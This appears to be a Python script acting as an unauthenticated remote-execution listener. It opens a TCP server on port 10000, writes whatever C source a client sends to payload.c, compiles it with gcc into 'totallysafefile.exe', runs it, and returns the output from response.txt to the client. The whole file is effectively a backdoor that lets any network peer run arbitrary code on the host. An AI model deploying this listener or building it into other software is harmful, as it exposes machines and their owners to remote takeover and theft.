import socket
import sys
import time 
import os

connect = 1
sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
timeout = time.time() + 60

sock2 = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
sock2.connect(("8.8.8.8", 80))
local_ip = sock2.getsockname()[0]
sock2.close()


server_address = (local_ip, 10000)
print('starting server on {} port {}'.format(*server_address))

sock.bind(server_address)
sock.listen(1)

while connect > 0:
	print('waiting for a connection')
	connection, client_address = sock.accept()

	try:
		print('connection from', client_address)
		while True:
			if time.time() > timeout:
				connect -= 1
				raise StopIteration
			data = connection.recv(1024)
			print('received {!r}'.format(data))

			if data:
				with open("payload.c", "w") as payload:
					data = str(data)
					# replace newline escapes with linefeeds
					data = data.replace('\\n', chr(10))
					# remove start and end quotes and byte indicator
					final_data = data[2:-1]
					payload.write(final_data)
					payload.close()

				# compile the source file recieved 
				cmd = "gcc payload.c -o totallysafefile.exe"
				os.system(cmd)
				time.sleep(1)

				# run the payload binary
				cmd2 = "./totallysafefile.exe"
				os.system(cmd2)
				time.sleep(1)

				# reply to client with the text generated by the binary
				with open("response.txt", "r") as response:
					final_response = (response.read())
					final_response = str.encode(final_response)
					connection.sendall(final_response)
					response.close()
				print("We're done here")
				connect -= 1
				raise StopIteration
			

			else:
				print('no data from', client_address)
				break

	except StopIteration: pass
		
print("Goodbye")
connection.close()
